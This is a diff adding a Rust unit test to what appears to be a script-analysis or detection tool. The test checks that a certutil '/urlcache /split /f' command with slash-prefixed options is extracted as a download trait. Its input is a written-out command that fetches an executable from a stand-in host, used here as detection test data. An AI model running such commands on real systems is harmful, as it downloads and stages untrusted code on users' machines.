@@ -7162,6 +7162,26 @@ mod certutil_tests {
     }
 
     #[test]
+    fn certutil_urlcache_accepts_slash_option_prefix() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "certutil /urlcache /split /f http://slash-cert.example/y.exe out.exe",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "http://slash-cert.example/y.exe" && dst == "out.exe"
+            )
+        });
+        assert!(
+            has,
+            "slash-prefixed certutil urlcache was not extracted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn certutil_urlcache_accepts_schemeless_domain_path() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
